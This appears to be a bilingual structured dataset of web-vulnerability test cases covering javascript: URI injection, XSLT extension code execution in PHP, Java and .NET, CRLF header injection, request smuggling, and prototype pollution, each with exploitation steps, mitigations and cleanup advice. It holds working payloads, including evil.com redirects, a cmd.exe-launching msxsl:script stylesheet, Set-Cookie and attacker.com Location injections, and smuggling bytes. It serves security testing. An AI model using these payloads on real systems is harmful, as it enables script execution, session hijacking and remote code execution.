name.zh: JavaScript URI 危险协议执行

description.zh: 验证用户可控链接或跳转目标是否允许 javascript: 协议进入可执行浏览器上下文，并造成脚本执行或导航劫持。
description.en: Tests whether a user-controlled link or navigation target permits the javascript scheme to reach an executable browser context and trigger script execution or navigation takeover.

subCategory.zh: 危险 URI 协议注入

overview.zh: 该集合不是普通开放重定向地址，而是带 javascript: 协议的浏览器执行载荷。只有值进入 href、location 或等价可执行 Sink，且浏览器没有在解析前拒绝该协议时，才形成客户端脚本执行边界。
overview.en: This set is not a normal open-redirect list; it contains javascript-scheme browser execution inputs. The issue exists only when a value reaches href, location, or an equivalent executable sink and the browser does not reject the scheme before parsing.

vulnerability.zh: 风险来自应用只校验字符串前缀或目标域，却未在统一解码后按协议白名单重新解析 URL。模板转义无法阻止危险协议语义，框架路由器、DOM 赋值和浏览器规范化差异还可能让服务端检查与客户端执行结果不一致。
vulnerability.en: The weakness arises when an application checks string prefixes or destination hosts but does not parse the fully normalized URL against an allowlist of schemes. Template escaping does not remove dangerous-scheme semantics, and routers, DOM assignment, and browser normalization can disagree with server validation.

exploitation.zh: 步骤一用 https://example.test 建立正常链接与导航基线；步骤二逐项提交原始 JavaScript URI 并在浏览器开发者工具中记录最终 DOM 属性、实际协议和脚本副作用；步骤三在纯文本、禁用脚本和不同浏览器中复测，排除仅显示载荷、CSP 阻断或扫描器匹配关键字造成的假阳性。
exploitation.en: First establish a normal link and navigation baseline with https://example.test. Submit each original JavaScript URI and record the final DOM property, resolved scheme, and script side effect in browser tooling. Repeat in plain-text, script-disabled, and alternate-browser controls to exclude displayed text, CSP blocking, or keyword-only scanner matches as false positives.

mitigation.zh: 统一解码并使用标准 URL 解析器；只允许明确的 http/https 等业务协议并拒绝 javascript、data 与未知协议；在危险 DOM Sink 前执行上下文相关校验，同时部署严格 CSP 并保留浏览器回归测试。
mitigation.en: Normalize once and use a standard URL parser. Allow only business-required schemes such as HTTP and HTTPS and reject javascript, data, and unknown schemes. Validate before dangerous DOM sinks, deploy a strict CSP, and retain browser regression tests.

description.zh: 确认输入最终进入链接、location 或其他由浏览器解释协议的属性，而不是普通文本节点。
description.en: Confirm that input reaches a link, location, or another browser-interpreted URI property rather than a plain-text node.

title.zh: 回放 JavaScript URI 集合

description.zh: 提交原始协议变体并记录浏览器解析后的属性值、CSP 决策以及可观察脚本副作用。
description.en: Submit the original scheme variants and record the browser-resolved property, CSP decision, and observable script side effect.

attackChain.payload:
javascript:window.location='https://evil.com'
javascript:document.location='https://evil.com'
javascript:location.href='https://evil.com'
javascript:location='https://evil.com'
javascript:this.location='https://evil.com'
javascript:self.location='https://evil.com'
javascript:top.location='https://evil.com'
javascript:parent.location='https://evil.com'
javascript:window.location.href='https://evil.com'
javascript:document.location.href='https://evil.com'

description.zh: 应用标准 URL 解析和协议白名单后重放，确认正常 HTTPS 链接保留而危险协议被拒绝。
description.en: Replay after standard URL parsing and scheme allowlisting to confirm normal HTTPS links remain while dangerous schemes are rejected.

review.rationale: 原命令的最终 Sink 是浏览器 URI 执行，应从 SQL 注入改归 XSS，而不是仅按导航效果归开放重定向。

prerequisites.zh: 可控值进入 href、location 或等价可导航 Sink，应用未在最终赋值前拒绝 javascript:，且目标浏览器上下文允许该协议执行。
prerequisites.en: A controllable value reaches href, location, or another navigable sink without final rejection of javascript:, and the target browser context permits the scheme to execute.

prerequisites.zh: 使用隔离页面和仅设置一次性内存 marker 的 javascript: URI，启用导航 API、CSP 和事件调用栈跟踪，不访问外部域。
prerequisites.en: An isolated page uses a javascript: URI that sets a one-time in-memory marker only, with navigation APIs, CSP, and event stacks traced and no external origin contacted.

analysis.zh: 阳性证据是应用真实赋值或用户测试点击使可控 javascript: 在页面来源下执行 marker，输入、DOM 属性、触发事件和调用栈完整关联。 假阳性边界：URI 仅显示为文本、浏览器/CSP 阻断、链接未触发、普通 HTTPS 跳转、地址栏手工执行或安全扫描器匹配协议字符串均不是执行。
analysis.en: Positive evidence requires a real application assignment or test click to execute the controlled javascript: marker under the page origin, correlating input, DOM attribute, trigger event, and call stack. False-positive boundary: A URI displayed as text, browser or CSP blocking, an untriggered link, ordinary HTTPS navigation, manual address-bar execution, or scanner string matching does not prove execution.

opsecTips.zh: JavaScript URI 测试禁止访问 cookie/storage 或跳到公共域；出现顶层导航、窗口打开、用户数据读取、外连或非测试会话时停止。
opsecTips.en: JavaScript URI testing never accesses cookies or storage or navigates to public origins; stop on top-level navigation, window opening, user-data reads, egress, or a non-test session.

opsecTips.zh: 删除测试链接和 marker，恢复 href/location 值，清理 history、BFCache 与站点数据，并重载确认协议不再触发。
opsecTips.en: Delete test links and markers, restore href or location values, clear history, BFCache, and site data, and reload to confirm the scheme no longer triggers.

name.zh: PHP XSLT 扩展函数代码执行

description.zh: 验证 PHP XSL 处理器是否允许不受信任样式表调用 php:function，并把 system 等进程函数暴露为远程代码执行 Sink。
description.en: Tests whether a PHP XSL processor allows an untrusted stylesheet to invoke php:function and exposes process functions such as system as a remote-code-execution sink.

subCategory.zh: PHP XSLT 扩展函数执行

overview.zh: 这组样式表通过 PHP 命名空间扩展调用宿主函数，不是 SQL 或普通 XML 语法测试。成立条件包括攻击者能影响完整或关键 XSLT 节点、运行时注册 PHP 函数，以及转换进程拥有可观察的操作系统权限。
overview.en: These stylesheets invoke host functions through the PHP extension namespace; they are not SQL or ordinary XML syntax tests. Exploitation requires control of a complete or critical XSLT node, registered PHP functions, and observable operating-system privileges in the transform process.

vulnerability.zh: 若服务端把上传或拼接的 XSLT 当作可信代码执行，并启用 registerPHPFunctions 或等价能力，样式表表达式就可跨越数据转换边界调用 system。仅解析 XML 并不等于执行，实际根因是扩展函数暴露与不可信样式表共存。
vulnerability.en: If a server executes uploaded or composed XSLT as trusted code while registerPHPFunctions or equivalent capability is enabled, stylesheet expressions can cross the transformation boundary and invoke system. XML parsing alone is not execution; the root cause is exposing extension functions to untrusted stylesheets.

exploitation.zh: 步骤一用只输出固定文本的 XSLT 记录处理器和执行账号基线；步骤二提交原始 php:function 样式表，并以受控无害命令的标准输出、进程审计或系统调用日志确认执行；步骤三禁用 PHP 扩展后重放，排除 XML 回显、报错中出现命令文本或静态规则命中造成的假阳性。
exploitation.en: First record the processor and service-account baseline with a stylesheet that emits fixed text. Submit the original php:function stylesheet and confirm execution through controlled harmless output, process auditing, or system-call logs. Replay with PHP extensions disabled to exclude XML echoing, command text in errors, or static-rule matches as false positives.

mitigation.zh: 禁止用户控制可执行样式表；关闭 PHP XSL 扩展函数注册并采用无扩展的受限处理器；以低权限隔离转换进程、限制文件与网络访问，并对允许的模板做完整性校验和回归测试。
mitigation.en: Do not let users control executable stylesheets. Disable PHP XSL extension-function registration and use a restricted processor without host extensions. Isolate transformation under least privilege, restrict file and network access, and integrity-check approved templates with regression tests.

title.zh: 确认 PHP XSL 扩展面
title.en: Confirm the PHP XSL extension surface

description.zh: 使用无副作用样式表确定处理器类型、PHP 函数注册状态和转换服务账号边界。
description.en: Use a side-effect-free stylesheet to identify the processor, PHP function registration, and transform service-account boundary.

description.zh: 提交原始 PHP XSLT 集合并从进程审计与转换输出确认宿主函数确实被调用。
description.en: Submit the original PHP XSLT set and confirm actual host-function invocation from process auditing and transform output.

description.zh: 禁用扩展函数并降低运行权限后重放，确认合法数据转换仍工作且系统命令不再产生。
description.en: Replay after disabling extensions and reducing runtime privileges to confirm valid transformation remains while system commands disappear.

review.rationale: php:function 调用宿主 system 是明确的 XSLT 到操作系统执行链，应归 RCE。

prerequisites.zh: 攻击者样式表进入 PHP XSLTProcessor，处理器允许 registerPHPFunctions 或等价函数桥，PHP/XSL 版本和允许函数列表可核验。
prerequisites.en: An attacker stylesheet reaches PHP XSLTProcessor with registerPHPFunctions or an equivalent bridge enabled, and PHP or XSL versions plus allowed functions are verifiable.

prerequisites.zh: 注册只返回固定 canary 的测试 PHP 函数并跟踪 php:function resolution；原 system/id/whoami/文件读取样式表只离线保留。
prerequisites.en: A test PHP function returning only a fixed canary is registered and php:function resolution traced, while source system, id, whoami, and file-read stylesheets remain offline.

analysis.zh: 阳性证据是目标 XSLT 转换解析 php:function 并由宿主调用测试 PHP 函数产生 canary，stylesheet 哈希、函数调用栈与转换任务对应。 假阳性边界：PHP namespace被解析、样式表编译成功、函数桥禁用/未注册、system 字符串回显、XPath 错误或本地不同配置执行均不是目标 RCE。
analysis.en: Positive evidence requires the target transformation to resolve php:function and have the host invoke the test PHP function to produce a canary, correlating stylesheet hash, function stack, and transform job. False-positive boundary: Parsed PHP namespaces, successful stylesheet compilation, a disabled or unregistered bridge, reflected system text, XPath errors, or execution under a different local configuration does not prove target RCE.

opsecTips.zh: PHP XSLT 扩展验证不执行原系统命令；出现进程、文件/网络副作用、任意 PHP 函数访问、转换缓存污染或 worker 异常时停止。
opsecTips.en: PHP XSLT extension validation never executes source system commands; stop on processes, file or network effects, arbitrary PHP-function access, transform-cache contamination, or worker anomalies.

opsecTips.zh: 移除测试函数/stylesheet/canary，撤销 registerPHPFunctions，清理 XSLT/OPcache/任务缓存并重启隔离 PHP worker。
opsecTips.en: Remove test functions, stylesheets, and canaries, revoke registerPHPFunctions, clear XSLT, OPcache, and job caches, and restart isolated PHP workers.

name.zh: Java Xalan XSLT 扩展代码执行
name.en: Java Xalan XSLT Extension Code Execution

description.zh: 验证 Java XSLT 处理器是否允许攻击者控制的命名空间映射到 Runtime 等宿主类，并从转换表达式调用进程执行。
description.en: Tests whether a Java XSLT processor lets attacker-controlled namespaces map to host classes such as Runtime and invoke process execution from a transform expression.

overview.zh: 原载荷依赖 Xalan 风格的 Java 扩展命名空间，把 XSLT 表达式连接到 java.lang.Runtime。它只在特定处理器、扩展函数未被安全模式禁用且不可信样式表真实参与转换时有效，因此必须先识别实现而非把任何 XML 响应都判为 RCE。
overview.en: The source payload relies on Xalan-style Java extension namespaces that connect XSLT expressions to java.lang.Runtime. It works only with a compatible processor, extensions enabled outside secure mode, and an untrusted stylesheet actually used for transformation, so implementation evidence is required before calling any XML response RCE.

vulnerability.zh: 应用若允许上传、覆盖或拼接 XSLT，并使用可反射调用 Java 类的方法解析扩展命名空间，数据转换模板便成为代码。处理器安全特性、类加载策略和服务账号权限共同决定影响，单独看到 Runtime 字符串不能证明调用发生。
vulnerability.en: When an application permits uploaded, replaced, or composed XSLT and resolves extension namespaces into reflective Java calls, a data-transform template becomes code. Processor security features, class-loading policy, and service-account privileges determine impact; seeing a Runtime string alone does not prove invocation.

exploitation.zh: 步骤一用 system-property 和固定输出确定 Xalan 实现及安全处理配置；步骤二提交原始 Runtime 扩展载荷，以无害命令输出、Java 进程创建事件和服务日志三者交叉确认；步骤三开启 secure-processing 并禁用扩展重放，排除解析错误、模板回显或其他后台任务造成的假阳性。
exploitation.en: First use system-property and fixed output to identify the Xalan implementation and secure-processing state. Submit the original Runtime extension payload and correlate harmless output, Java child-process events, and service logs. Replay with secure processing and extensions disabled to exclude parse errors, template echoing, or unrelated background jobs as false positives.

mitigation.zh: 只执行受版本控制且签名的 XSLT；启用 JAXP 安全处理并禁止外部扩展函数与任意类解析；在无网络、只读文件系统和低权限账号中运行转换，同时监控异常子进程。
mitigation.en: Execute only versioned and integrity-checked XSLT. Enable JAXP secure processing and block external extension functions and arbitrary class resolution. Run transforms without network access, on a read-only filesystem, under least privilege, and monitor unexpected child processes.

title.zh: 识别 Xalan 与安全模式

description.zh: 先确认实际 Java 转换实现、扩展命名空间支持和 secure-processing 配置状态。
description.en: Identify the actual Java transform implementation, extension-namespace support, and secure-processing configuration.

title.zh: 执行 Runtime 扩展探针

description.zh: 提交原始 Xalan 样式表并关联转换响应、Java 子进程事件以及服务端审计记录。
description.en: Submit the original Xalan stylesheet and correlate the transform response, Java child-process events, and server audit records.

description.zh: 启用安全处理和扩展禁用策略后复测，确认正常 XSLT 输出保留但 Runtime 调用消失。
description.en: Retest with secure processing and extension blocking to confirm normal XSLT output remains while Runtime invocation disappears.

review.rationale: 该条依赖 Xalan Java 扩展调用 Runtime，最终影响是宿主进程执行而非普通 XML 注入。

prerequisites.zh: 可控 stylesheet 由支持 Xalan Java 扩展命名空间的 JAXP Transformer 执行，secure processing 和扩展函数策略已确认。
prerequisites.en: A controlled stylesheet is executed by a JAXP Transformer supporting Xalan Java-extension namespaces, with secure-processing and extension-function policy confirmed.

prerequisites.zh: 隔离类路径提供只返回固定 canary 的测试静态方法，并跟踪命名空间到类/方法解析；Runtime.exec 源样例不执行。
prerequisites.en: An isolated classpath provides a test static method returning only a fixed canary and traces namespace-to-class and method resolution; source Runtime.exec samples are not executed.

analysis.zh: 阳性证据是目标 Xalan 处理器把攻击者命名空间映射到宿主测试类并调用方法产生 canary，TransformerFactory、类加载和调用栈相符。 假阳性边界：stylesheet 中存在 Runtime URI、处理器换成 Saxon/JDK 内置、secure-processing 拒绝扩展、类找不到、XPath 错误或命令文本回显均不是执行。
analysis.en: Positive evidence requires the target Xalan processor to map the attacker namespace to the host test class and invoke its method to produce a canary, with TransformerFactory, class loading, and call stack aligned. False-positive boundary: A Runtime URI in the stylesheet, use of Saxon or another processor, secure-processing rejection, a missing class, XPath errors, or reflected command text does not prove execution.

opsecTips.zh: Java XSLT 扩展测试禁止 Runtime/ProcessBuilder 和非测试类；出现进程、反射扩散、文件/网络访问、类加载异常或 JVM 不稳定时停止。
opsecTips.en: Java XSLT extension testing forbids Runtime, ProcessBuilder, and nontest classes; stop on processes, reflection expansion, file or network access, class-loading anomalies, or JVM instability.

opsecTips.zh: 销毁隔离 Transformer/JVM，删除测试类、stylesheet 与 canary，清理 TransformerFactory/模板缓存并恢复安全处理配置。
opsecTips.en: Destroy the isolated Transformer and JVM, delete test classes, stylesheets, and canaries, clear TransformerFactory and template caches, and restore secure-processing configuration.

name.zh: .NET msxsl:script 代码执行

description.zh: 验证 .NET XSLT 转换是否接受攻击者提供的 msxsl:script 脚本块，并在宿主进程中编译执行 C# 代码。
description.en: Tests whether a .NET XSLT transformation accepts an attacker-provided msxsl:script block and compiles and executes C# code in the host process.

overview.zh: msxsl:script 允许部分 .NET XSLT 实现把脚本块编译为宿主程序集。原语料通过 Process 启动命令，成立前提是应用使用支持脚本的旧式 XslTransform 或启用了脚本的 XslCompiledTransform，并真正处理攻击者样式表。
overview.en: msxsl:script lets some .NET XSLT implementations compile script blocks into host assemblies. The source uses Process to launch commands and requires an implementation with script enabled plus actual processing of an attacker-controlled stylesheet.

vulnerability.zh: 如果应用将 XsltSettings.EnableScript 打开并允许外部提供样式表，脚本就绕过了数据转换边界，继承服务进程的文件、网络和进程权限。现代运行时可能直接拒绝脚本，因此必须区分功能不可用、编译失败与真正执行。
vulnerability.en: If an application enables XsltSettings.EnableScript and accepts external stylesheets, script crosses the data-transform boundary and inherits the service process's file, network, and process privileges. Modern runtimes may reject scripts outright, so unsupported functionality, compilation failure, and actual execution must be distinguished.

exploitation.zh: 步骤一记录 .NET 运行时、XSLT API 与 EnableScript 基线；步骤二提交原始 msxsl:script，并用受控输出、进程创建遥测和转换异常记录确认 C# 代码是否编译运行；步骤三关闭脚本并在相同模板输入下重放，排除源码回显、编译器错误或预存文件造成的假阳性。
exploitation.en: First record the .NET runtime, XSLT API, and EnableScript baseline. Submit the original msxsl:script and use controlled output, process-creation telemetry, and transform exceptions to determine whether C# compiled and ran. Replay with script disabled to exclude source echoing, compiler errors, or preexisting files as false positives.

mitigation.zh: 保持 XSLT 脚本功能关闭；只从受信仓库加载固定样式表并校验完整性；将转换放入低权限隔离进程，限制子进程、文件与网络能力并监控动态编译事件。
mitigation.en: Keep XSLT scripting disabled. Load only fixed integrity-checked stylesheets from a trusted repository. Isolate transforms under least privilege, restrict child-process, file, and network capabilities, and monitor dynamic compilation events.

description.zh: 确认使用的转换 API、运行时版本以及脚本和文档函数是否被显式启用。
description.en: Confirm the transform API, runtime version, and whether script and document functions are explicitly enabled.

description.zh: 回放原始样式表并从动态编译、进程事件和转换输出证明脚本的实际执行。
description.en: Replay the original stylesheet and prove script execution through dynamic compilation, process events, and transform output.

attackChain.payload:
<?xml version="1.0" encoding="utf-8"?><xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:my="http://example.com/my"><msxsl:script language="C#" implements-prefix="my"><![CDATA[ public string exec(){ System.Diagnostics.Process proc = new System.Diagnostics.Process(); proc.StartInfo.FileName = "cmd.exe"; proc.StartInfo.Arguments = "/c id"; proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true; proc.Start(); return proc.StandardOutput.ReadToEnd(); }]]></msxsl:script><xsl:template match="/"><xsl:value-of select="my:exec()"/></xsl:template></xsl:stylesheet>

description.zh: 关闭 EnableScript 并隔离运行权限后重放，确认合法转换可用且脚本块被稳定拒绝。
description.en: Replay after disabling EnableScript and isolating privileges to confirm valid transforms work and script blocks are consistently rejected.

review.rationale: msxsl:script 在启用脚本时编译并运行 C#，真实类别是 .NET XSLT RCE。

prerequisites.zh: 攻击者 XSLT 进入 .NET XslCompiledTransform，XsltSettings.EnableScript 为真且 msxsl:script 可由宿主编译，运行时版本可核验。
prerequisites.en: An attacker XSLT reaches .NET XslCompiledTransform with XsltSettings.EnableScript true and msxsl:script compilable by the host, with runtime version verifiable.

prerequisites.zh: 脚本块只定义返回固定 canary 的纯函数，跟踪 CodeDOM/脚本编译和扩展方法调用；原 Process/cmd.exe 样例不执行。
prerequisites.en: The script block defines only a pure function returning a fixed canary, with CodeDOM or script compilation and extension calls traced; source Process and cmd.exe samples are not executed.

analysis.zh: 阳性证据是目标转换器接受 msxsl:script、在宿主编译测试 C# 并从 XSLT 调用返回 canary，程序集、任务和调用栈连续关联。 假阳性边界：XML parser 接受 script 元素、EnableScript=false 抛错、仅编译 XSLT 不编译 C#、脚本代码出现在错误或另一 .NET 配置成功均不是 RCE。
analysis.en: Positive evidence requires the target transformer to accept msxsl:script, compile test C# in the host, and invoke it from XSLT to return a canary, correlating assembly, job, and call stack. False-positive boundary: XML acceptance of the script element, an EnableScript=false error, XSLT compilation without C# compilation, script code in errors, or success under another .NET configuration does not prove RCE.

opsecTips.zh: .NET XSLT 脚本测试不启动 Process 或访问宿主 API；出现程序集落盘、进程、文件/网络动作、AppDomain 异常或 worker 重启时停止。
opsecTips.en: .NET XSLT script testing never starts Process or accesses host APIs; stop on assemblies written to disk, processes, file or network actions, AppDomain anomalies, or worker restarts.

opsecTips.zh: 终止测试 AppDomain/worker，删除脚本 stylesheet、临时程序集和 canary，清理 XSLT 缓存并恢复 EnableScript=false。
opsecTips.en: Terminate the test AppDomain or worker, delete script stylesheets, temporary assemblies, and canaries, clear XSLT caches, and restore EnableScript=false.

name.zh: HTTP CRLF 响应头注入

description.zh: 验证请求输入在服务端解码后是否进入 HTTP 响应头并注入新的 Header、Cookie、Location 或响应正文边界。
description.en: Tests whether request input is decoded into an HTTP response header and injects a new header, cookie, location, or response-body boundary.

subCategory.zh: HTTP 响应拆分与头注入
subCategory.en: HTTP Response Splitting and Header Injection

overview.zh: CRLF 载荷只有在应用、框架或反向代理将其解码并写入响应头值时才有安全意义。原集合同时覆盖新 Header、Set-Cookie、Location 和正文分隔，审校时必须捕获未经客户端重排的原始响应字节。
overview.en: CRLF input matters only when an application, framework, or reverse proxy decodes it into a response-header value. The set covers new headers, Set-Cookie, Location, and body boundaries, so review must capture raw response bytes before client reformatting.

vulnerability.zh: 根因是把不受信输入拼进响应头、重复解码或在代理与应用之间采用不同换行规范。现代框架常拒绝 CR/LF，若载荷只出现在请求、日志或 HTML 正文中，就没有跨越响应头结构边界。
vulnerability.en: The root cause is concatenating untrusted input into response headers, repeated decoding, or inconsistent newline handling between proxies and applications. Modern frameworks often reject CR and LF; if input appears only in the request, a log, or HTML body, it has not crossed the response-header boundary.

exploitation.zh: 步骤一找到会进入 Location 或自定义响应头的参数并记录正常响应；步骤二逐项发送原始编码与字面换行变体，保存代理前后的原始字节和浏览器头视图；步骤三检查新 Header、Cookie 或正文是否实际生效，排除日志换行、抓包工具格式化和正文回显造成的假阳性。
exploitation.en: First find a parameter written into Location or another response header and record a normal response. Send each encoded and literal-newline variant and preserve raw bytes on both sides of the proxy plus the browser header view. Verify that a new header, cookie, or body actually takes effect, excluding log newlines, capture-tool formatting, and body echo as false positives.

mitigation.zh: 禁止把用户输入直接拼入响应头；使用框架 Header API 并拒绝解码后包含 CR 或 LF 的值；统一代理与应用的解码策略、减少重复解码，并为 Cookie 与重定向路径增加原始字节回归测试。
mitigation.en: Never concatenate user input into response headers. Use framework header APIs and reject values containing CR or LF after canonical decoding. Align proxy and application decoding, avoid repeated decoding, and add raw-byte regression tests for cookies and redirects.

description.zh: 确认输入由哪个组件写入哪个响应头，并保存不含换行时的代理与源站基线。
description.en: Identify which component writes input into which response header and preserve proxy and origin baselines without newlines.

title.zh: 捕获 CRLF 原始字节

description.zh: 提交原始集合并比较代理前后字节，验证新增 Header、Cookie 或正文边界是否存在。
description.en: Submit the original set and compare bytes before and after the proxy to verify any new header, cookie, or body boundary.

attackChain.payload:
%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert()</script>
%0d%0aSet-Cookie:%20sessionid=attacker
%0d%0aLocation:%20http://attacker.com
\r\nContent-Type: text/html\r\n\r\n<script>alert()</script>
\r\nSet-Cookie: sessionid=attacker
\r\nX-Injected: header
\nContent-Type: text/html\n\n<script>alert()</script>
/%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert()</script>
Host: example.com%0d%0aInjected-Header: value
User-Agent: Mozilla/5.0%0d%0aX-Injected: value

title.zh: 回归 Header API 校验

description.zh: 切换到安全 Header API 并统一解码后重放，确认正常值保留且所有换行形式被拒绝。
description.en: Replay after adopting safe header APIs and aligned decoding to confirm normal values remain and all newline forms are rejected.

review.rationale: 该条是 HTTP 响应头结构注入，不属于 SQL/NoSQL；成功必须以原始响应字节和浏览器副作用证明。

prerequisites.zh: 请求参数经实际解码/规范化后被写入 HTTP 响应头值，响应由可观察的 HTTP/1.1 serializer 生成而非仅应用日志。
prerequisites.en: A request parameter is decoded and normalized into an HTTP response-header value generated by an observable HTTP/1.1 serializer rather than an application log only.

prerequisites.zh: 使用唯一 X-Test-CRLF marker 和无敏感测试 Cookie/Location，抓取客户端可见原始响应字节，并记录代理、框架与服务器各层值。
prerequisites.en: A unique X-Test-CRLF marker plus nonsensitive test Cookie or Location is used, capturing client-visible raw response bytes and values at proxy, framework, and server layers.

analysis.zh: 阳性证据是可控 CR/LF 在最终响应分帧前保留，创建一个新的独立 Header 或正文边界，原始字节和浏览器/客户端解析结果一致。 假阳性边界：换行只在日志、JSON 或 HTML 中出现、被 percent 编码返回、框架拆成安全值、代理添加同名 Header、HTTP/2 禁止字段或扫描器猜测均不是注入。
analysis.en: Positive evidence requires controlled CR or LF to survive until final response framing and create a distinct new header or body boundary, with raw bytes matching browser or client parsing. False-positive boundary: Newlines appearing only in logs, JSON, or HTML, percent-encoded output, safe framework splitting, a proxy-added header, HTTP/2 field rejection, or scanner guesses does not prove injection.

opsecTips.zh: CRLF 测试只注入 X-Test 标头，不设置真实 session、缓存或外部 Location；出现缓存污染、用户 Cookie、响应错位或代理连接异常时停止。
opsecTips.en: CRLF testing injects an X-Test header only and never real sessions, cache directives, or external Location values; stop on cache contamination, user cookies, response desynchronization, or proxy-connection anomalies.

opsecTips.zh: 删除测试参数/响应对象，清理代理/CDN/浏览器缓存和测试 Cookie，关闭原始抓包，恢复头值校验后回归。
opsecTips.en: Delete test parameters and response objects, clear proxy, CDN, and browser caches plus test cookies, close raw captures, restore header-value validation, and regress.

name.zh: HTTP 请求边界走私变体

description.zh: 验证前端代理与后端服务器对 Content-Length、Transfer-Encoding 和异常字节的解析差异是否造成请求队列错位。
description.en: Tests whether front-end and back-end HTTP parsers disagree about Content-Length, Transfer-Encoding, or malformed bytes and desynchronize the request queue.

overview.zh: 原命令包含重复 Content-Length、冲突 Transfer-Encoding 和控制字节变体，测试的是两个 HTTP 解析器对同一字节流的消息边界判断。单个 400、连接关闭或 WAF 告警都不能证明发生请求走私。
overview.en: The source contains duplicate Content-Length, conflicting Transfer-Encoding, and control-byte variants that test how two HTTP parsers frame the same byte stream. A single 400 response, closed connection, or WAF alert does not prove request smuggling.

vulnerability.zh: 当入口代理与源站对 CL/TE 优先级、重复头合并或非法字符容忍度不一致时，前端认为属于一个请求的剩余字节可能被后端当作下一请求。影响取决于连接复用、队列共享以及受害请求能否被稳定干扰。
vulnerability.en: When an edge proxy and origin disagree on CL or TE precedence, duplicate-header combination, or malformed-character tolerance, bytes treated as one request by the front end may become a subsequent request at the back end. Impact depends on connection reuse, queue sharing, and repeatable interference with a victim request.

exploitation.zh: 步骤一用正常 POST 和两次独立探测建立前后端连接基线；步骤二以原始字节发送每个分帧变体，并在同一后端连接追加唯一 Canary 请求；步骤三关联代理与源站日志中的请求数、边界和 Canary 顺序，排除超时抖动、限流或普通 keep-alive 行为造成的假阳性。
exploitation.en: First establish front-end and origin connection baselines with a normal POST and two independent probes. Send each framing variant as raw bytes and append a uniquely tagged canary request on the same back-end connection. Correlate request counts, boundaries, and canary order in proxy and origin logs to exclude timeout jitter, rate limiting, or ordinary keep-alive behavior as false positives.

mitigation.zh: 在边缘统一拒绝模糊或重复的分帧头；让代理与源站采用一致且及时更新的 HTTP 解析器；避免不可信请求复用后端连接，并用原始字节差分测试覆盖 CL.CL、CL.TE、TE.CL 和异常编码。
mitigation.en: Reject ambiguous or duplicate framing headers at the edge. Keep proxy and origin parsers aligned and updated. Avoid reusing back-end connections for untrusted requests, and maintain raw-byte differential tests for CL.CL, CL.TE, TE.CL, and malformed encodings.

description.zh: 记录代理与源站对正常请求的字节长度、请求数量、连接复用和日志标识。
description.en: Record byte length, request count, connection reuse, and log identifiers for a normal request at both parsers.

description.zh: 通过原始套接字回放命令集合并附加唯一 Canary，禁止由高级客户端重写 Header。
description.en: Replay the command set through a raw socket with a unique canary and prevent high-level clients from rewriting headers.

attackChain.payload:
POST / HTTP/1.1\r\n
Host: target.com\r\n
Content-Length: 6\r\n
0\r\n
Content-Length: 3\r\n
8\r\n
SMUGGLED\r\n
Transfer-Encoding: chunked, identity
Transfer-Encoding: identity, chunked
Transfer-Encoding: chu\x00nked

description.zh: 关联两端日志确认请求边界错位，统一解析策略后重复同一字节流验证差异消失。
description.en: Correlate both logs to prove boundary desynchronization, align parser policy, and replay the same bytes to verify the discrepancy disappears.

review.rationale: 内容是 HTTP 消息分帧差异测试，原请求走私分类正确但名称和证据链需去除来源条数噪声。

prerequisites.zh: 存在至少两个按顺序处理同一持久连接的 HTTP 解析器，前端/后端对 Content-Length、Transfer-Encoding 或异常字节的规则可分别观察。
prerequisites.en: At least two HTTP parsers sequentially process the same persistent connection, with frontend and backend rules for Content-Length, Transfer-Encoding, or abnormal bytes observable separately.

prerequisites.zh: 专用隔离 origin 为每个连接和请求返回唯一 sentinel，测试只发送最小双请求序列并记录前端字节、后端请求日志和连接 ID。
prerequisites.en: A dedicated isolated origin returns a unique sentinel for each connection and request, and testing sends a minimal two-request sequence while recording frontend bytes, backend request logs, and connection identifiers.

analysis.zh: 阳性证据是前后端边界判断不同，导致第二 sentinel 请求在后端被拼接、截断或错误归属到另一前端请求，连接级证据可重复。 假阳性边界：400/502、超时、连接关闭、WAF 阻断、单解析器接受畸形请求、客户端显示两响应或后端正常记录两个请求均不是走私。
analysis.en: Positive evidence requires differing frontend and backend boundaries to concatenate, truncate, or misattribute the second sentinel request at the backend, reproducibly at the connection level. False-positive boundary: HTTP 400 or 502, timeouts, connection closure, WAF blocking, one parser accepting malformed input, two client-visible responses, or two normal backend requests does not prove smuggling.

opsecTips.zh: 请求走私只在无用户流量的专用链路单连接执行；出现跨连接影响、真实请求错位、缓存写入、连接池异常或服务延迟时停止。
opsecTips.en: Request-smuggling testing runs on a dedicated user-free chain with one connection; stop on cross-connection effects, real-request misattribution, cache writes, pool anomalies, or service latency.

opsecTips.zh: 关闭并排空所有测试连接/连接池，清理代理和 origin 日志/缓存/sentinel，重启隔离代理后重放正常分帧基线。
opsecTips.en: Close and drain all test connections and pools, clear proxy and origin logs, caches, and sentinels, restart isolated proxies, and replay normal-framing baselines.

name.zh: JavaScript 对象合并原型污染

description.zh: 验证 JSON 或嵌套属性合并是否允许 __proto__ 或 constructor.prototype 改写共享原型，并影响后续授权、DOM 或代码执行 Sink。
description.en: Tests whether JSON or nested-property merging lets __proto__ or constructor.prototype modify a shared prototype and influence later authorization, DOM, or code-execution sinks.

subCategory.zh: 对象合并与原型属性注入
subCategory.en: Object Merge and Prototype Property Injection

overview.zh: 原集合混合污染源与多个潜在 Gadget，包括 isAdmin、innerHTML、src 和 Node 运行配置。审计必须先证明共享原型被改写，再证明目标对象在未显式设置属性时继承该值，最后确认具体 Sink 产生安全影响。
overview.en: The set combines pollution sources with possible gadgets such as isAdmin, innerHTML, src, and Node runtime configuration. Review must first prove shared-prototype modification, then inherited values on objects without own properties, and finally a concrete security effect at a sink.

vulnerability.zh: 易受影响的递归合并、路径赋值或反序列化逻辑未拒绝 __proto__、prototype 和 constructor 等特殊键，导致攻击者把属性写入 Object.prototype 或自定义构造器原型。污染本身与可利用 Gadget 是两个独立证据阶段。
vulnerability.en: Vulnerable recursive merge, path assignment, or deserialization code fails to reject special keys such as __proto__, prototype, and constructor, letting an attacker write to Object.prototype or a custom constructor prototype. Pollution and an exploitable gadget are separate evidence stages.

exploitation.zh: 步骤一在隔离进程中用普通嵌套对象记录合并结果和自有属性基线；步骤二逐项提交原始 JSON，检查新建空对象是否意外继承唯一 Canary 属性；步骤三单独触发授权、DOM 或进程 Gadget 并重启进程复测，排除响应回显、对象自身属性或测试间残留造成的假阳性。
